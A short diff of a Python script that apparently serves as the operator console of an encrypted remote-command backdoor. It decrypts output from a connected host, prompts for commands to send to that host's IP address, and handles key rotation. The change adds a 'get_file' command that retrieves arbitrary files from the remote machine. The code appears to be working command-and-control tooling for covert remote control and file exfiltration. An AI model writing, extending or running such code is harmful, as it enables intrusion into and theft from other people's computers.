@@ -60,7 +60,7 @@ def client(conn, addr, buff):
         data = get_data(conn, buff)
         if data == 0:
             break
-        print('\n'+str(do_decrypt(data).strip(), 'utf-8'))
+        print(str(do_decrypt(data).strip(), 'utf-8'))
         while True:
             try:
                 reply=input('Enter command for %s: ' %addr[0])
@@ -70,6 +70,8 @@ def client(conn, addr, buff):
                 print('update_key\nget_file /path/to/file')
             elif reply == "update_key":
                 sendit(conn, update_aeskeys())
+            elif 'get_file' in reply:
+                sendit(conn, do_encrypt(reply))
             elif reply.strip() == '':
                 continue
             else:
